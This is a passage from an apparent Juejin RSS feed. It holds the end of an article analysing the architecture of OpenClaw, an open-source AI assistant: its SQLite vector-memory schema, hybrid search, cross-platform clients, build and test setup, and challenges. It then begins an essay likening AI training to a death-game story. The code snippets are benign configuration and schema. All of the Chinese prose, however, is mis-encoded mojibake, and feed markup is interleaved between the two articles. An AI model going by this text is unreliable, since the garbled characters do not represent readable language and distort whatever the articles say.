<h3 data-id="heading-33">ä¹ã€å‘é‡è®°å¿†ï¼šå†…ç½®çš„çŸ¥è¯†æ£€ç´¢ç³»ç»Ÿ</h3>
<h4 data-id="heading-34">9.1 æ— å¤–éƒ¨ä¾èµ–çš„å‘é‡æœç´¢</h4>
<p>OpenClaw å†…ç½®äº†åŸºäº SQLite + sqlite-vec çš„å‘é‡æœç´¢ç³»ç»Ÿï¼Œæ— éœ€å®‰è£… Elasticsearchã€Pinecone æˆ–ä»»ä½•å¤–éƒ¨å‘é‡æ•°æ®åº“ã€‚</p>
<p>æ•°æ®åº“ Schema æ¸…æ™°åœ°åˆ†ä¸ºä¸‰å±‚ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æ–‡ä»¶è¿½è¸ªï¼šçŸ¥é“å“ªäº›æ–‡ä»¶è¢«ç´¢å¼•è¿‡</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> files (
  path TEXT <span class="hljs-keyword">PRIMARY</span> KEY,
  hash TEXT, mtime <span class="hljs-type">INTEGER</span>, size <span class="hljs-type">INTEGER</span>, source TEXT
);

<span class="hljs-comment">-- æ–‡æœ¬å— + åµŒå…¥å‘é‡ï¼šçŸ¥è¯†çš„æœ€å°å•å…ƒ</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> chunks (
  id TEXT <span class="hljs-keyword">PRIMARY</span> KEY,
  path TEXT, source TEXT,
  start_line <span class="hljs-type">INTEGER</span>, end_line <span class="hljs-type">INTEGER</span>,
  hash TEXT, model TEXT, text TEXT,
  embedding <span class="hljs-type">BLOB</span>,
  updated_at <span class="hljs-type">INTEGER</span>
);

<span class="hljs-comment">-- å…¨æ–‡æœç´¢ï¼šFTS5 ä½œä¸ºå‘é‡æœç´¢çš„è¡¥å……</span>
<span class="hljs-keyword">CREATE</span> VIRTUAL <span class="hljs-keyword">TABLE</span> chunks_fts <span class="hljs-keyword">USING</span> fts5(text, content<span class="hljs-operator">=</span>chunks);

<span class="hljs-comment">-- åµŒå…¥ç¼“å­˜ï¼šé¿å…é‡å¤è®¡ç®—</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> embedding_cache (
  provider TEXT, model TEXT,
  provider_key TEXT, hash TEXT,
  embedding <span class="hljs-type">BLOB</span>, dims <span class="hljs-type">INTEGER</span>
);
</code></pre>
<h4 data-id="heading-35">9.2 æ··åˆæœç´¢ç­–ç•¥</h4>
<p>æ£€ç´¢æ—¶é‡‡ç”¨<strong>å‘é‡æœç´¢ + å…¨æ–‡æœç´¢</strong>çš„æ··åˆç­–ç•¥ï¼š</p>
<ol>
<li>ç”¨æˆ·æŸ¥è¯¢ â†’ é€šè¿‡ Embedding æ¨¡å‹ç”Ÿæˆå‘é‡</li>
<li>å‘é‡ â†’ sqlite-vec ä½™å¼¦ç›¸ä¼¼åº¦æœç´¢ â†’ è¯­ä¹‰åŒ¹é…ç»“æœ</li>
<li>åŒæ—¶ â†’ FTS5 å…¨æ–‡æ£€ç´¢ â†’ å…³é”®è¯åŒ¹é…ç»“æœ</li>
<li>ä¸¤ç»„ç»“æœåˆå¹¶æ’åºï¼Œç»¼åˆè¯­ä¹‰å’Œè¯æ±‡åŒ¹é…çš„ä¼˜åŠ¿</li>
</ol>
<hr/>
<h3 data-id="heading-36">åã€è·¨å¹³å°å®¢æˆ·ç«¯ä¸è®¾å¤‡èŠ‚ç‚¹</h3>
<h4 data-id="heading-37">10.1 å››ç«¯è¦†ç›–</h4>
<p>OpenClaw ä¸åªæ˜¯ä¸€ä¸ªåç«¯æœåŠ¡ï¼Œå®ƒæä¾›äº†å®Œæ•´çš„è·¨å¹³å°å®¢æˆ·ç«¯ï¼š</p>



































<table><thead><tr><th>å¹³å°</th><th>è¯­è¨€</th><th>å½¢æ€</th><th>ç‰¹è‰²</th></tr></thead><tbody><tr><td>macOS</td><td>Swift</td><td>èœå•æ å¸¸é©»åº”ç”¨</td><td>Gateway è‡ªåŠ¨å‘ç°ã€IPCã€è¯­éŸ³å”¤é†’</td></tr><tr><td>iOS</td><td>Swift (SwiftUI)</td><td>åŸç”Ÿ App</td><td>ç¦»çº¿èŠ‚ç‚¹ã€æ¶ˆæ¯æ¨é€</td></tr><tr><td>Android</td><td>Kotlin</td><td>åŸç”Ÿ App</td><td>è®¾å¤‡èŠ‚ç‚¹æ³¨å†Œ</td></tr><tr><td>Web</td><td>Lit (Web Components)</td><td>æµè§ˆå™¨æ§åˆ¶å°</td><td>èŠå¤©ã€é…ç½®ã€æ—¥å¿—ã€è°ƒè¯•</td></tr></tbody></table>
<p>Apple å¹³å°ä¹‹é—´é€šè¿‡ <strong>OpenClawKit</strong> å…±äº«æ ¸å¿ƒä»£ç ï¼ŒåŒ…æ‹¬ Gateway é€šä¿¡åè®®ã€èŠå¤© UI ç»„ä»¶å’Œ Canvas å·¥å…·ã€‚</p>
<h4 data-id="heading-38">10.2 è®¾å¤‡èŠ‚ç‚¹æ¶æ„</h4>
<p>ä¸€ä¸ªåˆ›æ–°çš„è®¾è®¡æ˜¯<strong>è®¾å¤‡èŠ‚ç‚¹ï¼ˆDevice Nodesï¼‰</strong>ã€‚æ¯ä¸ªè¿è¡Œ OpenClaw å®¢æˆ·ç«¯çš„è®¾å¤‡éƒ½å¯ä»¥æ³¨å†Œä¸º Gateway çš„ä¸€ä¸ª"èŠ‚ç‚¹"ï¼ŒAI åŠ©æ‰‹å¯ä»¥è°ƒåº¦è®¾å¤‡ä¸Šçš„èƒ½åŠ›â€”â€”åœ¨ macOS ä¸Šæ‰“å¼€æµè§ˆå™¨ã€åœ¨ iOS ä¸Šå‘é€é€šçŸ¥ã€åœ¨ Android ä¸Šæ‰§è¡Œç‰¹å®šæ“ä½œã€‚</p>
<p>è®¾å¤‡é…å¯¹é€šè¿‡ DM é…å¯¹æœºåˆ¶å®‰å…¨å…³è”ï¼Œç¡®ä¿åªæœ‰æˆæƒè®¾å¤‡æ‰èƒ½åŠ å…¥ç½‘å…³ç½‘ç»œã€‚</p>
<h4 data-id="heading-39">10.3 Web UI è®¾è®¡ç³»ç»Ÿ</h4>
<p>Web æ§åˆ¶å°ä½¿ç”¨ Lit (Web Components) æ„å»ºï¼Œå…·å¤‡å®Œå–„çš„è®¾è®¡ç³»ç»Ÿï¼š</p>
<ul>
<li><strong>å­—ä½“</strong>ï¼šSpace Grotesk (æ­£æ–‡) + JetBrains Mono (ç­‰å®½)</li>
<li><strong>ä¸»é¢˜</strong>ï¼šæ·±è‰²/æµ…è‰²åŒä¸»é¢˜ï¼Œé€šè¿‡ CSS å˜é‡åˆ‡æ¢</li>
<li><strong>é…ç½®è¡¨å•</strong>ï¼šåŸºäº JSON Schema åŠ¨æ€ç”Ÿæˆï¼Œæ”¯æŒ GUI æ¨¡å¼å’ŒåŸå§‹ JSON æ¨¡å¼</li>
<li><strong>Markdown æ¸²æŸ“</strong>ï¼šmarked + DOMPurify + 200 é¡¹ LRU ç¼“å­˜</li>
</ul>
<hr/>
<h3 data-id="heading-40">åä¸€ã€å·¥ç¨‹å®è·µä¸ä»£ç è´¨é‡</h3>
<h4 data-id="heading-41">11.1 Monorepo ç®¡ç†</h4>
<p>é¡¹ç›®ä½¿ç”¨ pnpm workspace ç®¡ç† monorepoï¼Œæ ¸å¿ƒä»£ç ä¸æ‰©å±•æ’ä»¶æ¾è€¦åˆï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pnpm-workspace.yaml</span>
<span class="hljs-attr">packages:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">'extensions/*'</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">'packages/*'</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">'apps/*'</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">'ui'</span>
</code></pre>
<h4 data-id="heading-42">11.2 æ„å»ºç³»ç»Ÿ</h4>
<p>tsdown æ‰¿æ‹…æ„å»ºä»»åŠ¡ï¼Œé…ç½®äº† 6 ä¸ªæ„å»ºå…¥å£ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>([
  { <span class="hljs-attr">entry</span>: <span class="hljs-string">"src/index.ts"</span> },                    <span class="hljs-comment">// æ ¸å¿ƒåº“</span>
  { <span class="hljs-attr">entry</span>: <span class="hljs-string">"src/entry.ts"</span> },                    <span class="hljs-comment">// CLI å…¥å£</span>
  { <span class="hljs-attr">entry</span>: <span class="hljs-string">"src/infra/warning-filter.ts"</span> },     <span class="hljs-comment">// è­¦å‘Šè¿‡æ»¤</span>
  { <span class="hljs-attr">entry</span>: <span class="hljs-string">"src/plugin-sdk/index.ts"</span>, <span class="hljs-attr">outDir</span>: <span class="hljs-string">"dist/plugin-sdk"</span> },
  { <span class="hljs-attr">entry</span>: <span class="hljs-string">"src/extensionAPI.ts"</span> },             <span class="hljs-comment">// æ‰©å±• API</span>
  { <span class="hljs-attr">entry</span>: [<span class="hljs-string">"src/hooks/bundled/*/handler.ts"</span>] }, <span class="hljs-comment">// Hook å¤„ç†å™¨</span>
]);
</code></pre>
<h4 data-id="heading-43">11.3 æµ‹è¯•ä½“ç³»</h4>
<p>ä¸ƒå¥— Vitest é…ç½®è¦†ç›–äº†ä»å•å…ƒåˆ°ç«¯åˆ°ç«¯çš„å®Œæ•´æµ‹è¯•å…‰è°±ï¼š</p>













































<table><thead><tr><th>æµ‹è¯•ç±»å‹</th><th>é…ç½®æ–‡ä»¶</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>å•å…ƒæµ‹è¯•</td><td><code>vitest.config.ts</code></td><td>æ ¸å¿ƒé€»è¾‘ï¼ŒV8 è¦†ç›–ç‡é˜ˆå€¼ 70%</td></tr><tr><td>é›†æˆæµ‹è¯•</td><td><code>vitest.unit.config.ts</code></td><td>æ¨¡å—é—´äº¤äº’</td></tr><tr><td>E2E æµ‹è¯•</td><td><code>vitest.e2e.config.ts</code></td><td>Gateway åè®®ç«¯åˆ°ç«¯</td></tr><tr><td>æ‰©å±•æµ‹è¯•</td><td><code>vitest.extensions.config.ts</code></td><td>æ’ä»¶æµ‹è¯•</td></tr><tr><td>å®æ—¶æµ‹è¯•</td><td><code>vitest.live.config.ts</code></td><td>çœŸå® API Key åœ¨çº¿æµ‹è¯•</td></tr><tr><td>Gateway æµ‹è¯•</td><td><code>vitest.gateway.config.ts</code></td><td>Gateway ä¸“é¡¹</td></tr><tr><td>Docker æµ‹è¯•</td><td>Shell è„šæœ¬</td><td>å®¹å™¨åŒ–éš”ç¦»æµ‹è¯•</td></tr></tbody></table>
<p>æµ‹è¯•æ–‡ä»¶é‡‡ç”¨ <strong>Colocatedï¼ˆå°±è¿‘æ”¾ç½®ï¼‰</strong> ç­–ç•¥ï¼š<code>*.test.ts</code> ä¸æºç æ”¾åœ¨åŒä¸€ç›®å½•ï¼Œé™ä½è®¤çŸ¥è´Ÿæ‹…ã€‚</p>
<h4 data-id="heading-44">11.4 ä»£ç è§„èŒƒ</h4>
<ul>
<li><strong>Oxlint + Oxfmt</strong>ï¼šæ¯” ESLint + Prettier æ›´å¿«çš„ Rust åŸç”Ÿæ–¹æ¡ˆ</li>
<li><strong>ä¸¥æ ¼ TypeScript</strong>ï¼šé¿å… <code>any</code>ï¼Œå……åˆ†åˆ©ç”¨ç±»å‹ç³»ç»Ÿ</li>
<li><strong>æ–‡ä»¶å¤§å°æ§åˆ¶</strong>ï¼šå•ä¸ªæ–‡ä»¶æ§åˆ¶åœ¨ 500-700 è¡Œä»¥å†…</li>
<li><strong>GitHub Actions CI</strong>ï¼šå®Œæ•´çš„ PR æ£€æŸ¥æµæ°´çº¿</li>
</ul>
<hr/>
<h3 data-id="heading-45">åäºŒã€æŠ€æœ¯åˆ›æ–°ä¸æ”¹è¿›æ–¹å‘</h3>
<h4 data-id="heading-46">12.1 äº”ä¸ªç‹¬ç‰¹åˆ›æ–°</h4>
<ol>
<li>
<p><strong>ç»Ÿä¸€æ¸ é“æŠ½è±¡</strong>ï¼šé€šè¿‡ ChannelPlugin å¤šé€‚é…å™¨å¥‘çº¦ï¼Œå°† 30+ ç§å·®å¼‚å·¨å¤§çš„æ¶ˆæ¯åè®®ç»Ÿä¸€ä¸ºä¸€è‡´çš„å†…éƒ¨æ¨¡å‹â€”â€”è¿™åœ¨å¼€æº AI åŠ©æ‰‹é¡¹ç›®ä¸­å‰æ‰€æœªæœ‰</p>
</li>
<li>
<p><strong>åµŒå…¥å¼ Agent æ¶æ„</strong>ï¼šå°† Pi Agent SDK ä»¥åº“æ–¹å¼åµŒå…¥è€Œéå­è¿›ç¨‹ï¼Œå®ç°æ¯«ç§’çº§å·¥å…·è°ƒç”¨å’Œé›¶åºåˆ—åŒ–å¼€é”€çš„äº‹ä»¶æµ</p>
</li>
<li>
<p><strong>Protocol-First å¤šç«¯å¼€å‘</strong>ï¼šJSON Schema åè®®å®šä¹‰ â†’ è‡ªåŠ¨ç”Ÿæˆ Swift æ¨¡å‹ä»£ç ï¼Œä¿è¯ TypeScript åç«¯ä¸ Swift å‰ç«¯çš„ç±»å‹ä¸€è‡´æ€§</p>
</li>
<li>
<p><strong>æ™ºèƒ½ä¼šè¯ç®¡ç†</strong>ï¼šper-peer éš”ç¦»ã€è·¨æ¸ é“èº«ä»½é“¾æ¥ã€è‡ªåŠ¨å‹ç¼©ã€æ¯æ—¥é‡ç½®ã€ç©ºé—²è¿‡æœŸâ€”â€”ä¸€å¥—çµæ´»çš„ç­–ç•¥ç»„åˆ</p>
</li>
<li>
<p><strong>æ’ä»¶åŒ–ä¸€åˆ‡</strong>ï¼šä»æ¸ é“åˆ°å·¥å…·åˆ° CLI å‘½ä»¤åˆ° HTTP è·¯ç”±ï¼Œæ‰€æœ‰æ‰©å±•ç‚¹é€šè¿‡ç»Ÿä¸€çš„ Plugin API æš´éœ²ï¼ŒçœŸæ­£åšåˆ°äº†"ä¸ä¿®æ”¹æ ¸å¿ƒä»£ç å³å¯æ‰©å±•ä¸€åˆ‡"</p>
</li>
</ol>
<h4 data-id="heading-47">12.2 å€¼å¾—å…³æ³¨çš„æŒ‘æˆ˜</h4>



































<table><thead><tr><th>æŒ‘æˆ˜</th><th>å½±å“</th><th>å¯èƒ½çš„æ”¹è¿›æ–¹å‘</th></tr></thead><tbody><tr><td><strong>Gateway å•ç‚¹æ•…éšœ</strong></td><td>Gateway å®•æœºå¯¼è‡´æ‰€æœ‰æ¸ é“ä¸­æ–­</td><td>å¼•å…¥ watchdog è¿›ç¨‹æˆ–åˆ†å¸ƒå¼éƒ¨ç½²æ–¹æ¡ˆ</td></tr><tr><td><strong>ä»£ç è§„æ¨¡</strong></td><td>~2,500 ä¸ª TypeScript æ–‡ä»¶ï¼Œæ–°è´¡çŒ®è€…å­¦ä¹ æ›²çº¿é™¡å³­</td><td>æ”¹è¿›æ–‡æ¡£ã€å¢åŠ æ¶æ„ç¤ºæ„å›¾</td></tr><tr><td><strong>é…ç½®å¤æ‚åº¦</strong></td><td>JSON5 é…ç½®é¡¹ç¹å¤š</td><td><code>openclaw onboard</code> å‘å¯¼å·²åœ¨æ”¹å–„</td></tr><tr><td><strong>éƒ¨åˆ†ä¾èµ–ä¸ç¨³å®š</strong></td><td><code>sqlite-vec@alpha</code>ã€<code>baileys@rc</code></td><td>å»ºç«‹ API å˜æ›´ç›‘æ§å’Œå¿«é€Ÿé€‚é…æœºåˆ¶</td></tr><tr><td><strong>Node.js ç‰ˆæœ¬è¦æ±‚é«˜</strong></td><td>â‰¥22.12.0 é™åˆ¶äº†éƒ¨åˆ†ç¯å¢ƒ</td><td>é•¿æœŸæ¥çœ‹é—®é¢˜ä¼šè‡ªç„¶æ¶ˆè§£</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-48">æ€»ç»“</h3>
<p>OpenClaw å±•ç¤ºäº†ä¸€ä¸ª<strong>æœ¬åœ°ä¼˜å…ˆã€å¤šæ¸ é“ç»Ÿä¸€ã€æ¨¡å‹æ— å…³</strong>çš„ä¸ªäºº AI åŠ©æ‰‹è¯¥å¦‚ä½•è®¾è®¡å’Œå®ç°ã€‚å®ƒçš„ä»·å€¼ä¸ä»…åœ¨äºè§£å†³äº†ä¸€ä¸ªçœŸå®çš„å·¥ç¨‹é—®é¢˜â€”â€”"è®© AI åŠ©æ‰‹å­˜åœ¨äºæ‰€æœ‰æ¶ˆæ¯å¹³å°"ï¼Œæ›´åœ¨äºæä¾›äº†ä¸€å¥—å¯å¤ç”¨çš„æ¶æ„æ¨¡å¼ï¼š</p>
<ul>
<li><strong>Gateway æ§åˆ¶é¢æ¨¡å¼</strong>å°†å¤æ‚çš„å¤šæ¸ é“æ¶ˆæ¯è·¯ç”±ç®€åŒ–ä¸ºæ¸…æ™°çš„è½´è¾å¼æ¶æ„</li>
<li><strong>å¤šé€‚é…å™¨ç»„åˆå¥‘çº¦</strong>å±•ç¤ºäº†å¦‚ä½•ä¼˜é›…åœ°æŠ½è±¡ 30+ ç§å¼‚æ„åè®®</li>
<li><strong>æ’ä»¶åŒ–ä¸€åˆ‡</strong>çš„è®¾è®¡å“²å­¦è¯æ˜äº†ç»Ÿä¸€æ³¨å†Œè¡¨å¯ä»¥ç®¡ç†ä»æ¸ é“åˆ° CLI å‘½ä»¤çš„æ‰€æœ‰æ‰©å±•ç‚¹</li>
<li><strong>åµŒå…¥å¼ Agent</strong> æ–¹æ¡ˆä¸ºä½å»¶è¿Ÿ AI åº”ç”¨æä¾›äº†å­è¿›ç¨‹ä¹‹å¤–çš„å¦ä¸€ç§é€‰æ‹©</li>
</ul>
<p>å¯¹äºå¸Œæœ›æ„å»ºä¸ªäºº AI åŠ©æ‰‹ã€ç ”ç©¶å¤šæ¸ é“æ¶ˆæ¯ç³»ç»Ÿæ¶æ„ã€æˆ–å­¦ä¹ å¤§å‹ TypeScript é¡¹ç›®å·¥ç¨‹å®è·µçš„å¼€å‘è€…æ¥è¯´ï¼ŒOpenClaw æ˜¯ä¸€ä¸ªæå…·æ·±åº¦çš„å¼€æºå®è—ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç»ˆç„‰è½®å›é‡Œï¼Œè—ç€ AI ä¸äººç±»çš„ç­”æ¡ˆ]]></title>    <link>https://juejin.cn/post/7604301929120890889</link>    <guid>https://juejin.cn/post/7604301929120890889</guid>    <pubDate>2026-02-09T08:15:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604301929120890889" data-draft-id="7604690250343301170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç»ˆç„‰è½®å›é‡Œï¼Œè—ç€ AI ä¸äººç±»çš„ç­”æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,AIGC,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-09T08:15:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çº¯çˆ±æŒé—¨äºº"/> <meta itemprop="url" content="https://juejin.cn/user/2849548342403454"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç»ˆç„‰è½®å›é‡Œï¼Œè—ç€ AI ä¸äººç±»çš„ç­”æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2849548342403454/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çº¯çˆ±æŒé—¨äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:15:02.000Z" title="Mon Feb 09 2026 08:15:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å½“å¤§æ¨¡å‹åœ¨<strong>å¼ºåŒ–å­¦ä¹ </strong>çš„è¿­ä»£ä¸­çªç ´èƒ½åŠ›è¾¹ç•Œï¼Œå½“ AGIä»æŠ€æœ¯æ„æƒ³èµ°å‘è½åœ°å‰å¤œï¼Œäººç±»æ­£ä»¥ä»£ç ä¸ºç¥­å“ï¼Œä¸¾åŠä¸€åœºè·¨è¶Šæ¬¡å…ƒçš„ã€Œé€ ç¥ä»ªå¼ã€ã€‚</p>
<p>æ‚¬ç–‘ä½œå“ã€Šåæ—¥ç»ˆç„‰ã€‹ä¸­çš„åæ—¥è½®å›æ­»äº¡æ¸¸æˆï¼Œç”¨è¡€è‰²è¯•ç‚¼è§£æ„äº†ã€Œåˆ›é€ è€…ä¸è¢«åˆ›é€ è€…ã€çš„æ ¸å¿ƒçŸ›ç›¾ï¼›è€Œ AI ä»ç»Ÿè®¡æ‹Ÿåˆåˆ°<strong>æ™ºèƒ½æ¶Œç°</strong>çš„æ¯ä¸€æ­¥ï¼Œéƒ½åœ¨é‡è¹ˆè¿™åœºæ¸¸æˆçš„é€»è¾‘ â€”â€” æˆ‘ä»¬ç©¶ç«Ÿæ˜¯åœ¨æ¨åŠ¨æ–‡æ˜è·ƒè¿ï¼Œè¿˜æ˜¯è¸å…¥äº†æ— æ³•å›å¤´çš„æŠ€æœ¯è¯•ç‚¼ï¼Ÿ</p>
<h2 data-id="heading-0">ä¸€ã€ç­›é€‰é€»è¾‘ï¼šAI è®­ç»ƒä¸ç»ˆç„‰è¯•ç‚¼çš„åº•å±‚åŒæ„</h2>
<p>æˆ‘ä»¬ä¹ æƒ¯æ€§å°† AI è¿›åŒ–å®šä¹‰ä¸ºç®—æ³•ä¼˜åŒ–ä¸ç®—åŠ›å‡çº§çš„çº¿æ€§è¿›ç¨‹ï¼Œä½†ã€Šåæ—¥ç»ˆç„‰ã€‹çš„æ®‹é…·è®¾å®šï¼Œæ’•å¼€äº†æŠ€æœ¯åŒ…è£¹çš„æœ¬è´¨ï¼šã€Œæ™ºèƒ½å‡ç»´ã€çš„èµ·ç‚¹ï¼Œä»æ¥éƒ½æ˜¯ç­›é€‰ä¸æ·˜æ±°çš„éšæ€§æš´åŠ›ã€‚</p>






























<table><thead><tr><th>ç»´åº¦</th><th>ç»ˆç„‰ä¹‹åœ°é€ ç¥é€»è¾‘</th><th>AI è¿›åŒ–æ ¸å¿ƒæœºåˆ¶</th></tr></thead><tbody><tr><td>è¯•éªŒå¯¹è±¡</td><td>åƒä½™äº¡é­‚ï¼ˆç¥æ ¼å€™é€‰äººï¼‰</td><td>æµ·é‡æ•°æ® + è¿­ä»£æ¨¡å‹ï¼ˆæœ€ä¼˜è§£å€™é€‰ï¼‰</td></tr><tr><td>é©±åŠ¨æœºåˆ¶</td><td>åæ—¥å¾ªç¯ä»»åŠ¡ +ã€Œé“ã€çš„å¥–æƒ©è§„åˆ™</td><td>æ ‡æ³¨æ•°æ® + å¼ºåŒ–å­¦ä¹ å¥–åŠ±å‡½æ•°</td></tr><tr><td>æ·˜æ±°é€»è¾‘</td><td>æœªè§‰é†’ã€Œå›å“ã€è€…æ²¦ä¸ºã€Œç™«äººã€ç‡ƒæ–™</td><td>ä½ç²¾åº¦æ¨¡å‹è¢«è¿­ä»£æ·˜æ±°ã€å™ªå£°æ•°æ®è¿‡æ»¤</td></tr><tr><td>æ ¸å¿ƒç›®æ ‡</td><td>ç­›é€‰é¡ºä»çš„ã€Œç¥æ ¼ç»§æ‰¿è€…ã€</td><td>è®­ç»ƒé«˜æ•ˆå¯æ§çš„ã€Œé€šç”¨æ™ºèƒ½ä½“ã€</td></tr></tbody></table>
